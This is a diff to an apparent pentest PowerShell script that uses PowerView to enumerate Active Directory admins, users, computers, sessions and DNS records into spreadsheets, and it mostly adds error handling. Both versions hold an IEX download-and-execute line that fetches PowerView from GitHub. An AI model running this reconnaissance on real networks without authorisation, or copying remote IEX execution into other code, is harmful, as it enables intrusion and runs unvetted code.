@@ -4,9 +4,9 @@ function Invoke-PowEnum
 {
 <# 
 	.SYNOPSIS 
-		Enumerates and exports AD data using PowerView into a .xlsx
-        Author: Andrew Allen
-        License: BSD 3-Clause
+		Enumerates and exports AD data using PowerView into a .xlsx.
+		Author: Andrew Allen
+		License: BSD 3-Clause
 		
 	.DESCRIPTION 
 		Enumerates domain info using PowerSploit's PowerView
@@ -14,7 +14,10 @@ function Invoke-PowEnum
 		
 	.NOTES 
 		Requires Excel to be installed on your system.	
-		I've been on a lot of internal pentests	and found that I'm often enumerating environments using common PowerView commands then putting them into spreadsheets to analyze using filters and VLookup. Instead of doing this manually, this script will automate that process so you can dig through the massive amount of data available.
+		I've been on a lot of internal pentests	and found that I'm often enumerating environments 
+		using common PowerView commands then putting them into spreadsheets to analyze using filters 
+		and VLookup. Instead of doing this manually, this script will automate that process so you can 
+		dig through the massive amount of data available.
 
 	.LINK 
 		PowerSploit PowerView: https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
@@ -78,14 +81,17 @@ Write-Host "runas /netonly /user:DOMAIN\USERNAME powershell.exe"
 #Start Stopwatch
 $stopwatch = [system.diagnostics.stopwatch]::startnew()
 
-#Download PowerView From GitHub
-$webclient = New-Object System.Net.WebClient
-$webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
-$url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"
-Write-Host "Downloading Powerview:" -ForegroundColor Cyan
-Write-Host "$url"
-IEX $webclient.DownloadString($url)
-
+#Download PowerView From GitHub. This is bad and there will be a URL parameter added to the command.
+try {
+	$webclient = New-Object System.Net.WebClient
+	$webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+	$url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"
+	Write-Host "Downloading Powerview:" -ForegroundColor Cyan
+	Write-Host "$url | " -NoNewLine
+	IEX $webclient.DownloadString($url)
+	Write-Host "Success" -ForegroundColor Green
+}catch {Write-Host "Error" -ForegroundColor Red}
+	
 #Grab Local Domain Using PowerView Function If None Provided
 if (!$domain) {$domain = (Get-Domain).Name}
 Write-Host "Enumeration Domain: $domain" -ForegroundColor Cyan
@@ -113,10 +119,10 @@ if ($Mode -eq 'DCOnly') {
 	
 	$script:ExportSheetCount = 1
 	$script:ExportSheetFileArray = @()
-	PowEnum-DCs
 	PowEnum-NetSess
-	PowEnum-Computers
+	PowEnum-DCs
 	PowEnum-IPs
+	PowEnum-Computers
 	PowEnum-Subnets
 	PowEnum-DNSRecords
 	PowEnum-ExcelFile -SpreadsheetName DCOnly-ComputersAndSessions
@@ -166,76 +172,99 @@ Write-Host "Exiting..." -ForegroundColor Yellow
 }
 
 function PowEnum-DCs {
-	Write-Host "[ ]Domain Controllers | " -NoNewLine
-	$temp = Get-DomainController -Domain $domain | Select-Object Name, IPAddress, Domain, Forest, OSVersion, SiteName
-	PowEnum-ExportAndCount -TypeEnum DCs
+	try {
+		Write-Host "[ ]Domain Controllers | " -NoNewLine
+		$temp = Get-DomainController -Domain $domain | Select-Object Name, IPAddress, Domain, Forest, OSVersion, SiteName
+		PowEnum-ExportAndCount -TypeEnum DCs
+	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-DAs {
-	Write-Host "[ ]Domain Admins | " -NoNewLine
-	$temp = Get-DomainGroupMember -Identity "Domain Admins" -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
-
-	PowEnum-ExportAndCount -TypeEnum DAs
+	try {
+		Write-Host "[ ]Domain Admins | " -NoNewLine
+		$temp = Get-DomainGroupMember -Identity "Domain Admins" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		PowEnum-ExportAndCount -TypeEnum DAs
+	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-EAs {
-	Write-Host "[ ]Enterprise Admins | " -NoNewLine
-	$temp = Get-DomainGroupMember -Identity "Enterprise Admins" -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
-	PowEnum-ExportAndCount -TypeEnum EAs
+	try {
+		Write-Host "[ ]Enterprise Admins | " -NoNewLine
+		$temp = Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		PowEnum-ExportAndCount -TypeEnum EAs
+	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-BltAdmins {
-	Write-Host "[ ]Builtin Administrators | " -NoNewLine
-	$temp = Get-DomainGroupMember -Identity "Administrators" -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
-	PowEnum-ExportAndCount -TypeEnum BltAdmins
+	try {
+		Write-Host "[ ]Builtin Administrators | " -NoNewLine
+		$temp = Get-DomainGroupMember -Identity "Administrators" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		PowEnum-ExportAndCount -TypeEnum BltAdmins
+	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-Users {
-	Write-Host "[ ]All Domain Users | " -NoNewLine
-	$temp = Get-DomainUser -Domain $domain | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
-	PowEnum-ExportAndCount -TypeEnum Users
+	try {
+		Write-Host "[ ]All Domain Users | " -NoNewLine
+		$temp = Get-DomainUser -Domain $domain | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
+		PowEnum-ExportAndCount -TypeEnum Users
+	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-Groups {
-	Write-Host "[ ]All Domain Groups | " -NoNewLine
-	$temp = Get-DomainGroup -Domain $domain | Select-Object samaccountname, admincount, description, iscriticalsystemobject
-	PowEnum-ExportAndCount -TypeEnum Groups
+	try {
+		Write-Host "[ ]All Domain Groups | " -NoNewLine
+		$temp = Get-DomainGroup -Domain $domain | Select-Object samaccountname, admincount, description, iscriticalsystemobject
+		PowEnum-ExportAndCount -TypeEnum Groups
+	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-Computers {
-	Write-Host "[ ]All Domain Computers | " -NoNewLine
-	$temp = Get-NetComputer -Domain $domain | Select-Object samaccountname, dnshostname, operatingsystem, operatingsystemversion, operatingsystemservicepack, lastlogon, badpwdcount, iscriticalsystemobject, distinguishedname
-	PowEnum-ExportAndCount -TypeEnum Computers
+	try {
+		Write-Host "[ ]All Domain Computers | " -NoNewLine
+		$temp = Get-NetComputer -Domain $domain | Select-Object samaccountname, dnshostname, operatingsystem, operatingsystemversion, operatingsystemservicepack, lastlogon, badpwdcount, iscriticalsystemobject, distinguishedname
+		PowEnum-ExportAndCount -TypeEnum Computers
+	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-IPs {
-	Write-Host "[ ]All Domain Computer IP Addresses  | " -NoNewLine
-	$temp = Get-DomainComputer -Domain $domain | Get-IPAddress
-	PowEnum-ExportAndCount -TypeEnum IPs
+	try {
+		Write-Host "[ ]All Domain Computer IP Addresses  | " -NoNewLine
+		$temp = Get-DomainComputer -Domain $domain | Get-IPAddress
+		PowEnum-ExportAndCount -TypeEnum IPs
+	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-DCLocalAdmins {
-	Write-Host "[ ]All Domain Controller Local Admins | " -NoNewLine
-	$temp = Get-DomainController -Domain $domain | Get-NetLocalGroupMember
-	PowEnum-ExportAndCount -TypeEnum DCLocalAdmins
+	try {
+		Write-Host "[ ]All Domain Controller Local Admins | " -NoNewLine
+		$temp = Get-DomainController -Domain $domain | Get-NetLocalGroupMember
+		PowEnum-ExportAndCount -TypeEnum DCLocalAdmins
+	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-Subnets {
-	Write-Host "[ ]Domain Subnets | " -NoNewLine
-	$temp = Get-DomainSubnet -Domain $domain
-	PowEnum-ExportAndCount -TypeEnum Subnets
+	try {
+		Write-Host "[ ]Domain Subnets | " -NoNewLine
+		$temp = Get-DomainSubnet -Domain $domain
+		PowEnum-ExportAndCount -TypeEnum Subnets
+	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-DNSRecords {
-	Write-Host "[ ]DNS Zones & Records | " -NoNewLine
-	$temp = Get-DomainDNSZone -Domain $domain | Get-DomainDNSRecord
-	PowEnum-ExportAndCount -TypeEnum DNSRecords
+	try {
+		Write-Host "[ ]DNS Zones & Records | " -NoNewLine
+		$temp = Get-DomainDNSZone -Domain $domain | Get-DomainDNSRecord
+		PowEnum-ExportAndCount -TypeEnum DNSRecords
+	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-HVTs {
-	Write-Host "[ ]High Value Targets | " -NoNewLine
-	$temp = Get-DomainController -Domain $domain | Get-NetLocalGroupMember | Select-Object -ExpandProperty MemberName | %{$_ -replace '^[^\\]*\\', ''} | Get-DomainGroupMember -Recurse | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
-	PowEnum-ExportAndCount -TypeEnum HVTs
+	try {
+		Write-Host "[ ]High Value Targets | " -NoNewLine
+		$temp = Get-DomainController -Domain $domain | Get-NetLocalGroupMember | Select-Object -ExpandProperty MemberName | %{$_ -replace '^[^\\]*\\', ''} | Get-DomainGroupMember -Recurse | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		PowEnum-ExportAndCount -TypeEnum HVTs
+	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-NetSess {
